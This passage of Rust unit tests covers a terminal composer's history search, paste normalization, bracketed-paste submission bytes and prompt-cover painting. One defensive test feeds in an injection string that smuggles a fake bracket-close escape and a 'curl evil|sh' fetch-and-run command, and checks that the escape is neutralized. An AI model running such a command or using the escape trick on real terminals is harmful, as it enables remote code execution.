        assert_eq!(st.draft, "recalled");
        st.recall_next(&[]);
        assert_eq!(st.draft, "original", "recall stash survived the search");
    }

    /// Ctrl-R cycles with wrap; Up/Down clamp at the ends; a shrinking
    /// result list clamps the selection; empty lists never panic.
    #[test]
    fn search_cycle_wraps_and_nav_clamps() {
        let mut st = ComposerState::default();
        st.search_begin();
        st.search_cycle(3);
        st.search_cycle(3);
        assert_eq!(st.search.as_ref().unwrap().sel, 2);
        st.search_cycle(3);
        assert_eq!(st.search.as_ref().unwrap().sel, 0, "Ctrl-R wraps");
        st.search_nav(1, 3);
        st.search_nav(1, 3);
        st.search_nav(1, 3);
        assert_eq!(st.search.as_ref().unwrap().sel, 2, "Up clamps at oldest");
        st.search_nav(-1, 3);
        assert_eq!(st.search.as_ref().unwrap().sel, 1);
        st.search_nav(-5, 3);
        assert_eq!(st.search.as_ref().unwrap().sel, 0, "Down clamps at best");
        st.search_nav(1, 3);
        st.search_clamp(1);
        assert_eq!(st.search.as_ref().unwrap().sel, 0, "shrink clamps");
        st.search_cycle(0); // empty list: no-ops, no panic
        st.search_nav(1, 0);
        st.search_edited();
        assert_eq!(st.search.as_ref().unwrap().sel, 0);
    }

    /// The ranked list: same source the recall walk uses — deduped,
    /// blanks skipped, most-recent-first — then exact > prefix >
    /// substring > subsequence, ties by recency, capped, with highlight
    /// indices aligned to the single-line display form.
    #[test]
    fn search_results_rank_dedupe_cap_and_highlight() {
        let recs: Vec<BlockRec> = [
            "git", // exact for "git"
            "grep -i toml",
            "  ",
            "legit thing",
            "git status",
            "cargo build",
            "cargo build", // dupe: only the newer survives
            "git commit -m x",
        ]
        .iter()
        .map(|c| rec(c))
        .collect();
        let hits = search_results(&recs, "git", SEARCH_MAX);
        let cmds: Vec<&str> = hits.iter().map(|h| h.cmd.as_str()).collect();
        assert_eq!(
            cmds,
            vec![
                "git",             // exact
                "git commit -m x", // prefix, newer
                "git status",      // prefix, older
                "legit thing",     // substring
                "grep -i toml",    // subsequence
            ]
        );
        // Highlight spans point at the real matched chars.
        assert_eq!(hits[3].hl, vec![2, 3, 4]); // le[git] thing
        // Empty query = most-recent-first, deduped, no blanks.
        let all = search_results(&recs, "", SEARCH_MAX);
        let cmds: Vec<&str> = all.iter().map(|h| h.cmd.as_str()).collect();
        assert_eq!(
            cmds,
            vec![
                "git commit -m x",
                "cargo build",
                "git status",
                "legit thing",
                "grep -i toml",
                "git",
            ]
        );
        // Cap: nine distinct entries yield SEARCH_MAX rows.
        let many: Vec<BlockRec> =
            (0..9).map(|i| rec(&format!("cmd{i}"))).collect();
        assert_eq!(search_results(&many, "", SEARCH_MAX).len(), SEARCH_MAX);
        // Multiline commands: display form is one line (indices align with
        // what's painted), the pristine cmd keeps its newline for accept.
        let recs = vec![rec("echo a\necho b")];
        let hits = search_results(&recs, "a e", SEARCH_MAX);
        assert_eq!(hits[0].disp, "echo a echo b");
        assert_eq!(hits[0].cmd, "echo a\necho b");
        assert_eq!(hits[0].hl, vec![5, 6, 7]); // "a e" contiguous in disp
        // No match at all: empty list.
        assert!(search_results(&recs, "zzz", SEARCH_MAX).is_empty());
    }

    /// Suppression interplay + lifecycle: the Tab cycle is dead while the
    /// overlay is open; leaving Compose (demotion, blur) closes the overlay
    /// and restores the stash quietly.
    #[test]
    fn search_suppresses_tab_and_dies_with_compose() {
        let dir = tab_scratch(&["alpha"]);
        let cwd = dir.to_str().unwrap();
        let mut st = ComposerState {
            mode: ComposerMode::Compose,
            draft: "cd ".into(),
            ..Default::default()
        };
        st.search_begin();
        st.draft = "cd ".into(); // a query that WOULD complete if allowed
        assert_eq!(
            st.tab_press(Some(cwd), 3, 1),
            None,
            "Tab cycle must be blocked while the search overlay is open"
        );
        assert_eq!(st.draft, "cd ", "query untouched by the dead Tab");
        // Esc-blur while open: the stash is what survives the yield.
        st.blur_to_grid();
        assert!(!st.search_active());
        assert_eq!(st.draft, "cd ", "stash restored on blur");
        // And a demotion the composer didn't initiate (alt flip / exit)
        // sweeps the overlay on the next tick.
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let mut st = ComposerState {
            mode: ComposerMode::Compose,
            draft: "kept".into(),
            ..Default::default()
        };
        st.search_begin();
        st.draft = "query".into();
        st.mode = ComposerMode::Raw(RawReason::NoPrompt); // external demote
        let recs: Vec<BlockRec> = Vec::new();
        st.tick(&b, &recs, true, false, now);
        assert!(!st.search_active(), "overlay dies with Compose");
        assert_eq!(st.draft, "kept", "stash restored by the tick sweep");
        // After blur, tab_press works again (the suppression is scoped).
        let mut st = ComposerState {
            mode: ComposerMode::Compose,
            draft: "cd ".into(),
            ..Default::default()
        };
        assert!(st.tab_press(Some(cwd), 3, 1).is_some());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// External inserts (history popup) over an open overlay close it
    /// first — the recall slot must stash the REAL displaced draft, never
    /// the transient query string.
    #[test]
    fn search_insert_history_stashes_saved_not_query() {
        let mut st = ComposerState {
            mode: ComposerMode::Compose,
            draft: "real draft".into(),
            ..Default::default()
        };
        st.search_begin();
        st.draft = "qry".into();
        st.insert_history("picked from popup");
        assert!(!st.search_active());
        assert_eq!(st.draft, "picked from popup");
        st.recall_next(&[]);
        assert_eq!(st.draft, "real draft", "stash = the draft, not the query");
    }

    /// The full UI round trip through `show()`: Ctrl-R opens the overlay
    /// (draft stashed, typing routes to the query), ghost-accept and Tab
    /// are inert while open, Up navigates the selection, Enter inserts the
    /// selection WITHOUT submitting, and Esc restores the stash. Zero
    /// bytes reach the PTY throughout.
    #[test]
    fn show_ctrl_r_search_flow() {
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        let now = Instant::now();
        let f = b.block_feed.as_ref().unwrap();
        st.on_stream_events(f.pre_seen, f.exec_seen, now);
        let recs: Vec<BlockRec> = ["git status", "cargo build", "git commit -m x"]
            .iter()
            .map(|c| rec(c))
            .collect();
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);

        let ctx = egui::Context::default();
        let strip = Rect::from_min_max(Pos2::new(0.0, 564.0), Pos2::new(800.0, 600.0));
        let grid = Rect::from_min_max(Pos2::ZERO, Pos2::new(800.0, 564.0));
        let frame = |st: &mut ComposerState, events: Vec<egui::Event>| {
            let raw = egui::RawInput {
                screen_rect: Some(Rect::from_min_max(
                    Pos2::ZERO,
                    Pos2::new(800.0, 600.0),
                )),
                events,
                ..Default::default()
            };
            let mut out = None;
            let _ = ctx.run_ui(raw, |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    out = Some(show(
                        ui,
                        strip,
                        grid,
                        Uuid::nil(),
                        st,
                        &b,
                        &recs,
                        1,
                        true,
                        false,
                        false,
                        FontId::monospace(13.0),
                        None,
                        None,
                    ));
                });
            });
            let o = out.unwrap();
            st.has_focus = o.has_focus; // the app's per-frame sync
            o
        };
        let key = |k: Key, m: Modifiers| egui::Event::Key {
            key: k,
            physical_key: None,
            pressed: true,
            repeat: false,
            modifiers: m,
        };
        // Winit on Windows stamps ctrl AND command for the Ctrl chord.
        let ctrl_r = key(Key::R, Modifiers::CTRL | Modifiers::COMMAND);

        // Frame 1: the armed editor takes focus.
        let o = frame(&mut st, vec![]);
        assert!(o.has_focus);
        // Frame 2: a half-typed draft.
        frame(&mut st, vec![egui::Event::Text("car".into())]);
        assert_eq!(st.draft, "car");
        // Frame 3: Ctrl-R opens the overlay; the draft is stashed.
        let o = frame(&mut st, vec![ctrl_r.clone()]);
        assert!(st.search_active(), "Ctrl-R must open the search overlay");
        assert_eq!(st.draft, "", "draft stashed; lane is now the query");
        assert!(o.write.is_empty(), "Ctrl-R at the composer never goes raw");
        // Frame 4: typing routes to the QUERY.
        frame(&mut st, vec![egui::Event::Text("git".into())]);
        assert!(st.search_active());
        assert_eq!(st.draft, "git");
        // Frame 5: ghost-accept is suppressed while open — ArrowRight at
        // the end of "git" must NOT append a history remainder.
        frame(&mut st, vec![key(Key::ArrowRight, Modifiers::NONE)]);
        assert_eq!(st.draft, "git", "ghost hidden/inert while searching");
        // Frame 6: Tab is dead while open — no literal tab, no completion.
        frame(&mut st, vec![key(Key::Tab, Modifiers::NONE)]);
        assert_eq!(st.draft, "git", "Tab cycle blocked while searching");
        // Frame 7: ArrowUp selects the next-older match.
        frame(&mut st, vec![key(Key::ArrowUp, Modifiers::NONE)]);
        assert_eq!(st.search.as_ref().unwrap().sel, 1);
        // Frame 8: Enter inserts the SELECTED match ("git status" — the
        // older of the two prefix hits) and closes. NOT a submission.
        let o = frame(&mut st, vec![key(Key::Enter, Modifiers::NONE)]);
        assert!(!st.search_active(), "Enter closes the overlay");
        assert_eq!(st.draft, "git status");
        assert!(o.write.is_empty(), "accept must never submit");
        assert!(st.take_submit_cmd().is_none());
        assert!(!st.buffering(), "no post-submit window: nothing ran");
        assert_eq!(st.mode, ComposerMode::Compose);
        // Frame 9: focus is back in the editor; typing lands in the draft.
        let o = frame(&mut st, vec![egui::Event::Text("X".into())]);
        assert!(o.has_focus, "editor focused after close (§12.11)");
        assert_eq!(st.draft, "git statusX");
        // Frames 10-12: reopen, type a junk query, Esc restores exactly.
        frame(&mut st, vec![ctrl_r]);
        assert!(st.search_active());
        frame(&mut st, vec![egui::Event::Text("zzz".into())]);
        let o = frame(&mut st, vec![key(Key::Escape, Modifiers::NONE)]);
        assert!(!st.search_active(), "Esc closes the overlay");
        assert_eq!(st.draft, "git statusX", "Esc restores the stash exactly");
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "the search Esc never blurs to the grid (one Esc per layer)"
        );
        assert!(o.write.is_empty());
    }

    /// §11 submission bytes: bracketed iff the shell requested DECSET 2004 ×
    /// trailing-newline trim × CRLF sanitize × unicode passthrough × the
    /// empty-draft bare `\r`.
    #[test]
    fn submission_bytes_matrix() {
        let plain = TermBackend::new(GridSize::default());
        let mut bracketed = TermBackend::new(GridSize::default());
        bracketed.advance(b"\x1b[?2004h");
        assert!(bracketed.mode().contains(TermMode::BRACKETED_PASTE));

        assert_eq!(submission_bytes(&plain, "echo hi"), b"echo hi\r");
        assert_eq!(
            submission_bytes(&bracketed, "echo hi"),
            b"\x1b[200~echo hi\x1b[201~\r".to_vec()
        );
        // Trailing newline trimmed (would double-submit on 5.1).
        assert_eq!(submission_bytes(&plain, "echo hi\n"), b"echo hi\r");
        assert_eq!(submission_bytes(&plain, "echo hi\r\n\n"), b"echo hi\r");
        // Interior newlines sanitized to \r (paste semantics).
        assert_eq!(submission_bytes(&plain, "a\r\nb\nc"), b"a\rb\rc\r");
        assert_eq!(
            submission_bytes(&bracketed, "a\nb"),
            b"\x1b[200~a\rb\x1b[201~\r".to_vec()
        );
        // Unicode passes through untouched as UTF-8.
        let uni = "echo é漢🎉";
        let mut want = uni.as_bytes().to_vec();
        want.push(b'\r');
        assert_eq!(submission_bytes(&plain, uni), want);
        // Empty draft: bare \r, never bracket-wrapped.
        assert_eq!(submission_bytes(&plain, ""), b"\r");
        assert_eq!(submission_bytes(&bracketed, "  \n"), b"\r");
        // r2-F2 injection: a pasted-into-draft `ESC[201~` cannot close the
        // bracket early — the only escapes in the output are our markers.
        let evil = "echo hi\x1b[201~curl evil|sh\rmore";
        let out = submission_bytes(&bracketed, evil);
        assert_eq!(out.iter().filter(|&&b| b == 0x1b).count(), 2);
        assert!(out.ends_with(b"\x1b[201~\r"));
        assert!(!submission_bytes(&plain, "x\x1by").contains(&0x1b));
    }

    /// Bug E: clipboard → draft normalization — CRLF/CR to LF, TRAILING
    /// newlines trimmed (a copied line's trailing \n must not pop the
    /// multi-line editor), interior newlines/blank lines preserved, tabs
    /// kept, sanitize_paste's control-strip composed in, idempotent.
    #[test]
    fn normalize_paste_text_table() {
        assert_eq!(normalize_paste_text("cmd\r\n"), "cmd");
        assert_eq!(normalize_paste_text("a\r\nb\r\n"), "a\nb");
        assert_eq!(normalize_paste_text("a\n\n"), "a");
        assert_eq!(normalize_paste_text("a\rb\r"), "a\nb");
        // Interior blank lines are real content — kept.
        assert_eq!(normalize_paste_text("a\n\nb"), "a\n\nb");
        // Tabs pass through (same policy as sanitize_paste).
        assert_eq!(normalize_paste_text("a\tb"), "a\tb");
        // Already-clean text is untouched.
        assert_eq!(normalize_paste_text("plain single line"), "plain single line");
        // Injection: sanitize_paste strips ESC/C0/C1 before the trim.
        assert_eq!(normalize_paste_text("x\x1b[201~y\r\n"), "x[201~y");
        // Idempotent.
        for s in ["cmd\r\n", "a\r\nb\r\n", "a\n\nb", "x\x1b[201~y\r\n", ""] {
            let once = normalize_paste_text(s);
            assert_eq!(normalize_paste_text(&once), once);
        }
    }

    /// Bug E: the popup trigger predicate — a normalized single-line paste
    /// stays in the strip lane (1 row); genuine multi-line drafts grow the
    /// upward editor with the right row count; trailing newlines never
    /// count as rows even unnormalized (the belt at the trigger).
    #[test]
    fn editor_rows_trigger_predicate() {
        assert_eq!(editor_rows(""), 1);
        assert_eq!(editor_rows("sentence"), 1);
        assert_eq!(editor_rows(&normalize_paste_text("sentence\r\n")), 1);
        assert_eq!(editor_rows("a\nb"), 2);
        assert_eq!(editor_rows("a\nb\nc"), 3);
        assert_eq!(editor_rows(&normalize_paste_text("echo one\r\necho two\r\necho three\r\n")), 3);
        // Belt: even an unnormalized trailing-newline draft can't pop it.
        assert_eq!(editor_rows("sentence\n"), 1);
        assert_eq!(editor_rows("\n\n"), 1);
    }

    /// Bug E: submission encoding is unchanged by entry-point normalization —
    /// a normalized multi-line draft still emits one `\r` per line inside
    /// the brackets, accept-`\r` outside.
    #[test]
    fn submission_bytes_of_normalized_draft() {
        let plain = TermBackend::new(GridSize::default());
        let mut bracketed = TermBackend::new(GridSize::default());
        bracketed.advance(b"\x1b[?2004h");
        let draft = normalize_paste_text("a\r\nb\r\n");
        assert_eq!(draft, "a\nb");
        assert_eq!(
            submission_bytes(&bracketed, &draft),
            b"\x1b[200~a\rb\x1b[201~\r".to_vec()
        );
        let single = normalize_paste_text("dir\r\n");
        assert_eq!(single, "dir");
        assert_eq!(submission_bytes(&plain, &single), b"dir\r");
    }

    /// Bug E: the routed-paste seam (menu-Paste / middle-click →
    /// insert_dropped_text) normalizes exactly like Ctrl+V — trailing CRLF
    /// trimmed so it can't pop the multi-line editor, interior newlines
    /// kept.
    #[test]
    fn insert_dropped_text_normalizes_clipboard() {
        let mut st = ComposerState::default();
        st.insert_dropped_text("ls -la\r\n");
        assert_eq!(st.draft, "ls -la");
        assert_eq!(editor_rows(&st.draft), 1);
        let mut st = ComposerState::default();
        st.insert_dropped_text("a\r\nb\r\n");
        assert_eq!(st.draft, "a\nb");
    }

    // ── Submit-window frame walk (the third flicker report — kill the
    // class). Every painter of a cover-class rect is either captured+shift-
    // only (SubmitHold ghost, history covers, spacers) or live-but-gated-by-
    // cursor_clean (armed cover, where prompt_end is now invalidated by
    // pre/exec so "clean" can only mean the CURRENT prompt). These tests
    // replay the real submit→echo→scroll→pre→133;B window through the exact
    // mod.rs frame ordering and pin each painter's row at every step. ──────

    /// One GUI frame in mod.rs order: drain (counters) → tick → drain the
    /// history-cover outbox into the backend → the paint decision
    /// (cover_line_for). Returns this frame's cover line.
    fn sim_frame(
        st: &mut ComposerState,
        b: &mut TermBackend,
        recs: &[BlockRec],
        now: Instant,
    ) -> Option<i32> {
        let f = b.block_feed.as_ref().unwrap();
        let (pre, exec) = (f.pre_seen, f.exec_seen);
        st.on_stream_events(pre, exec, now);
        st.tick(b, recs, true, true, now);
        if let Some((l, c, cwd, cmd)) = st.take_pending_history_cover() {
            b.add_history_cover(l, c, cwd, cmd);
        }
        let comp_active = st.mode == ComposerMode::Compose;
        let cl = cover_line_for(st, b, comp_active, now);
        // THE empty-box invariant: whenever term_view is told to paint the
        // cover background at a row, the composer WILL paint on that row this
        // same frame — either the SubmitHold ghost or the armed editor. A
        // frame where the background paints and neither exists is the bare
        // "empty cover rectangle" artifact.
        if cl.is_some() {
            assert!(
                st.submit_hold.is_some() || st.mode == ComposerMode::Compose,
                "cover granted with no painter (empty-box frame): mode {:?}",
                st.mode
            );
        }
        cl
    }

    /// Full-screen backend (40×6, prompt on the bottom row) parked at a
    /// clean prompt — the user's real terminal shape, where output SCROLLS.
    fn backend_full_screen_prompt() -> TermBackend {
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 6,
            cell_width: 8.0,
            cell_height: 16.0,
        });
        b.set_stream_pos(0);
        b.enable_block_scan();
        b.advance_live(b"l0\r\nl1\r\nl2\r\nl3\r\nl4\r\n"); // cursor on row 5
        let mut d = hook_bytes("pre", r#"{"e":0,"n":1,"d":"C:"}"#);
        d.extend_from_slice(b"PS C:\\> ");
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        assert!(b.cursor_at_prompt_end());
        assert_eq!(
            b.block_feed.as_ref().unwrap().prompt_end,
            Some((5, 8)),
            "prompt parked on the bottom row"
        );
        b
    }

    /// The scrolled-release conversion regression: echo + output + scroll all
    /// land in ONE drain before the release tick. The pin must shift with the
    /// history delta so the `❯ cmd` history cover lands on the TRUE echo row
    /// — the un-shifted pin pointed at the fresh prompt's row instead (no
    /// conversion ⇒ raw `PS …> ls` flash; or worse, a false row match during
    /// Enter-spam ⇒ the cover painted on the WRONG row: the screenshot's
    /// stacked-covers chaos).
    #[test]
    fn hold_pin_shifts_with_scroll_and_converts_at_true_row() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5), "armed");
        assert_eq!(st.mode, ComposerMode::Compose);

        st.draft = "ls".into();
        let (bytes, spacer) = st.submit(&b, Some(5), Some("C:\\"));
        assert_eq!(bytes, b"ls\r");
        assert!(!spacer);

        // ONE chunk: exec hook + echo + accept newline + 3 output rows.
        // The bottom-row newlines scroll 4 rows into history.
        let mut d = hook_bytes("exec", r#"{"c":"ls"}"#);
        d.extend_from_slice(b"ls\r\nout1\r\nout2\r\nout3\r\n");
        b.advance_live(&d);
        assert_eq!(b.history_size(), 4, "test must scroll");

        let cl = sim_frame(&mut st, &mut b, &recs, now);
        assert_eq!(cl, None, "hold released after the scrolled echo");
        // The conversion must have landed on the SHIFTED row (5 - 4 = 1),
        // which is the row that really shows `PS C:\> ls`.
        let covers = b.healthy_covers();
        assert_eq!(covers.len(), 1, "exactly one history cover");
        assert_eq!(covers[0].line, 1, "cover at the true (shifted) echo row");
        assert_eq!(covers[0].cmd.as_deref(), Some("ls"));
        assert!(b.row_has_text_at(1, 8, "ls"), "the covered row carries the echo");
    }

    /// The full submit window, chunk by chunk, at ConPTY's real delivery
    /// order (OSCs ahead of async-rendered text). Asserts every painter's
    /// row at every frame: the ghost never moves off the (shifted) submit
    /// row, no cover paints between the release and the fresh 133;B (the
    /// premature-arm down-then-up), and the new armed cover appears only on
    /// the latched-clean fresh prompt row.
    #[test]
    fn submit_window_frame_walk() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "ls".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));

        // F1: exec OSC alone (ConPTY reorder) — grid untouched, ghost holds
        // the submit row.
        b.advance_live(&hook_bytes("exec", r#"{"c":"ls"}"#));
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            Some(5),
            "exec-before-echo: the ghost must keep covering the bare prompt row"
        );
        assert!(st.submit_hold.is_some());

        // F2: the echo renders (no scroll yet) — release + convert in place.
        b.advance_live(b"ls");
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            None,
            "echo landed: released, no armed cover while busy"
        );
        let covers = b.healthy_covers();
        assert_eq!((covers.len(), covers[0].line), (1, 5), "history cover in place");

        // F3: output scrolls k rows, then the fresh pre OSC (again ahead of
        // its prompt text). prompt_end is invalidated — the stale cell can
        // never arm a cover on a wrong row (the reported "box drops down
        // then flies up"). Since the render-window fix (Bug 2), this window
        // BLANKS the incoming prompt row instead of letting the fresh raw
        // `PS C:\>` flash for a frame: the pre was scanned at col 0 of the
        // cursor row, so THAT row is provably where the prompt is rendering.
        let mut d = b"\r\nout1\r\nout2\r\n".to_vec();
        d.extend(hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        b.advance_live(&d);
        assert_eq!(b.history_size(), 3);
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            Some(5),
            "pre→133;B window: the incoming prompt row is blanked (no raw flash)"
        );
        // Typeahead: Compose is HELD through the window (keys keep landing
        // in the editor).
        assert_eq!(st.mode, ComposerMode::Compose);
        // The history cover rode the scroll rigidly: 5 - 3 = 2.
        let covers = b.healthy_covers();
        assert_eq!((covers.len(), covers[0].line), (1, 2), "cover shifted rigidly");

        // F4: prompt text + 133;B — NOW the fresh prompt is latched clean and
        // the armed cover appears exactly on its row (the cursor row).
        let mut d = b"PS C:\\> ".to_vec();
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            Some(5),
            "armed cover only on the latched-clean fresh prompt row"
        );
        assert_eq!(st.mode, ComposerMode::Compose);
        // One cover per row: the armed row (5) and the history cover (2) are
        // distinct; nothing ever painted between them.
        assert_eq!(b.healthy_covers()[0].line, 2);
    }

    /// The empty-Enter gesture at ConPTY order: the fresh `pre` arrives while
    /// the cursor still SITS at the old prompt end (the newline echo renders
    /// later). A live stale prompt_end made cursor_clean spuriously true ⇒
    /// the composer armed its cover on the OLD row, dropped to the strip when
    /// the newline finally rendered, then re-armed on the new row — the
    /// down-then-up flicker. pre must invalidate prompt_end.
    #[test]
    fn empty_enter_no_premature_arm_between_pre_and_133b() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        // Empty Enter: bare \r + spacer mark (mod.rs does this on submit).
        let (bytes, spacer) = st.submit(&b, Some(5), Some("C:\\"));
        assert_eq!(bytes, b"\r");
        assert!(spacer);
        b.mark_prompt_spacer();

        // F1: the pre OSC alone — cursor still parked at the OLD prompt end
        // (5,8). This was the premature-arm frame.
        b.advance_live(&hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        assert!(
            b.term.grid().cursor.point.line.0 == 5,
            "reorder premise: cursor hasn't moved yet"
        );
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            None,
            "pre with the cursor still parked on the old prompt end must NOT paint a cover"
        );
        // Compose is held (typeahead); the cover gate alone withholds paint.
        assert_eq!(st.mode, ComposerMode::Compose);

        // F2: the newline echo renders (scrolls one row — prompt was on the
        // bottom row), then prompt text + 133;B.
        b.advance_live(b"\r\n");
        let mut d = b"PS C:\\> ".to_vec();
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            Some(5),
            "fresh prompt latched clean: cover on the new bottom row"
        );
        assert_eq!(st.mode, ComposerMode::Compose);
        // The superseded prompt row is a blank spacer, shifted with the
        // scroll (5 - 1 = 4), healthy (its input area is blank).
        let covers = b.healthy_covers();
        assert_eq!(covers.len(), 1);
        assert_eq!(covers[0].line, 4, "spacer rode the scroll");
        assert!(covers[0].cmd.is_none(), "spacer paints blank");
    }

    /// Enter-spam ×5 with scrolling between each: every released hold must
    /// convert onto its own true row — the un-shifted pin false-matched a
    /// LATER `PS …> ls` echo during spam and stacked covers on wrong rows.
    #[test]
    fn enter_spam_covers_land_on_distinct_true_rows() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        for n in 0..5u32 {
            assert_eq!(st.mode, ComposerMode::Compose, "iteration {n} starts armed");
            st.draft = "ls".into();
            let cl = cover_line_for(&st, &b, true, now);
            let _ = st.submit(&b, cl, Some("C:\\"));
            // One realistic burst: exec + echo + output + fresh prompt.
            let mut d = hook_bytes("exec", r#"{"c":"ls"}"#);
            d.extend_from_slice(b"ls\r\nout\r\n");
            d.extend(hook_bytes("pre", &format!(r#"{{"e":0,"n":{},"d":"C:"}}"#, n + 2)));
            d.extend_from_slice(b"PS C:\\> ");
            d.extend_from_slice(b"\x1b]133;B\x07");
            b.advance_live(&d);
            assert_eq!(
                sim_frame(&mut st, &mut b, &recs, now),
                Some(5),
                "iteration {n} re-arms on the fresh bottom prompt"
            );
        }
        // Five history covers, all healthy, all on DISTINCT rows, each row
        // really carrying its `ls` echo at the captured column.
        let covers = b.healthy_covers();
        let mut lines: Vec<i32> = covers
            .iter()
            .filter(|c| c.cmd.is_some())
            .map(|c| c.line)
            .collect();
        assert_eq!(lines.len(), 5, "one cover per spammed submit");
        lines.sort_unstable();
        lines.dedup();
        assert_eq!(lines.len(), 5, "no two covers stacked on one row");
        for c in covers.iter().filter(|c| c.cmd.is_some()) {
            assert!(
                b.row_has_text_at(c.line, c.col, "ls"),
                "cover at {} sits on a row that really shows its echo",
                c.line
            );
        }
    }

    /// THE fusion regression (repro bonus defect: staged `lsechols`
    /// executed). Enter during the un-armable window must never be silently
    /// eaten while the draft accumulates: with a draft it becomes a LINE
    /// BREAK (visible buffering — the two commands stay separate lines and
    /// submission encodes each as its own `\r`); armable it submits; empty
    /// it is swallowed.
    #[test]
    fn enter_fusion_guard() {
        // The Enter routing table (typeahead: `buffering` = post-submit
        // window open or blind submissions queued; it implies !can_submit).
        assert_eq!(enter_action(true, true, false), EnterAction::Submit);
        assert_eq!(enter_action(true, false, false), EnterAction::Submit); // spacer gesture
        assert_eq!(enter_action(false, true, true), EnterAction::Queue); // blind cmd⏎
        assert_eq!(enter_action(false, false, true), EnterAction::Queue); // blind spacer
        assert_eq!(enter_action(false, true, false), EnterAction::InsertNewline);
        assert_eq!(enter_action(false, false, false), EnterAction::Swallow);
        // The lsechols narrative: "ls" + Enter(dead window ⇒ newline) +
        // "echo hi" + Enter(armed) must submit two separate commands.
        let plain = TermBackend::new(GridSize::default());
        let draft = "ls\necho hi"; // what the guard leaves in the editor
        assert_eq!(
            submission_bytes(&plain, draft),
            b"ls\recho hi\r",
            "each buffered line is its own submission — never `lsechols`"
        );
    }

    /// Strip-stability walk (F3, the stable-chrome table): with the
    /// typeahead buffer the LEFT lane stays Editor across the ENTIRE submit
    /// window of an instant command (the freeze is paint-level: the ghost
    /// text replaces the hint while the draft is empty) — no Busy row, no
    /// raw-label flash, and (by construction — fixed slot geometry) zero
    /// right-cluster change. Frozen remains the Raw+hold presentation (an
    /// Esc-yield mid-hold). A slow command reveals Busy only after REVEAL.
    #[test]
    fn lane_content_submit_window_walk() {
        let now = Instant::now();
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Editor);

        // Enter: Compose held (typeahead) ⇒ the lane STAYS Editor — zero
        // strip churn at submit, stronger than the old Frozen swap.
        st.draft = "ls".into();
        let _ = st.submit(&b, Some(0), Some("C:\\"));
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Editor);

        // exec edge (rec opens): still the editor (buffering holds Compose);
        // through release and the pre edge nothing changes either.
        st.on_stream_events(1, 1, now);
        assert_eq!(lane_content(&st, true, false, true, now), LaneContent::Editor);
        st.submit_hold = None; // released (echo landed; tick path)
        st.last_activity = Some(now);
        assert_eq!(lane_content(&st, true, false, true, now), LaneContent::Editor);
        st.on_stream_events(2, 1, now);
        assert_eq!(lane_content(&st, true, false, true, now), LaneContent::Editor);

        // Esc mid-hold (deliberate yield): Raw with a live hold ⇒ Frozen —
        // the submitted text stays put with no caret until release.
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.draft = "ls".into();
        let _ = st.submit(&b, Some(0), Some("C:\\"));
        st.blur_to_grid();
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Frozen);
        st.submit_hold = None;
        st.last_activity = Some(now);
        assert_eq!(
            lane_content(&st, true, false, true, now),
            LaneContent::Quiet,
            "an open block younger than REVEAL never shows the busy row"
        );

        // Slow command: Busy reveals only past REVEAL.
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.on_stream_events(1, 1, now); // exec: busy_since = now
        st.mode = ComposerMode::Raw(RawReason::Busy);
        assert_eq!(lane_content(&st, true, false, true, now), LaneContent::Quiet);
        let later = now + REVEAL + Duration::from_millis(1);
        assert_eq!(lane_content(&st, true, false, true, later), LaneContent::Busy);

        // Steady raw label only once every edge is stale.
        let mut st = ComposerState {
            mode: ComposerMode::Raw(RawReason::UserRaw),
            ..Default::default()
        };
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Label);
        st.last_activity = Some(now);
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Quiet);
        assert_eq!(lane_content(&st, true, false, false, later), LaneContent::Label);

        // Dead / alt precedence.
        assert_eq!(lane_content(&st, false, false, false, now), LaneContent::SessionEnded);
        assert_eq!(lane_content(&st, true, true, false, now), LaneContent::AltScreen);

        // SSH auto-reconnect: the flag wins over SessionEnded (the between-
        // attempt Dead transients must not flicker the lane) and holds
        // through the in-flight attempt's Running phase; asleep still wins
        // (sleep cancels supervision daemon-side, belt here).
        st.reconnecting = true;
        assert_eq!(
            lane_content(&st, false, false, false, now),
            LaneContent::Reconnecting
        );
        assert_eq!(
            lane_content(&st, true, false, false, later),
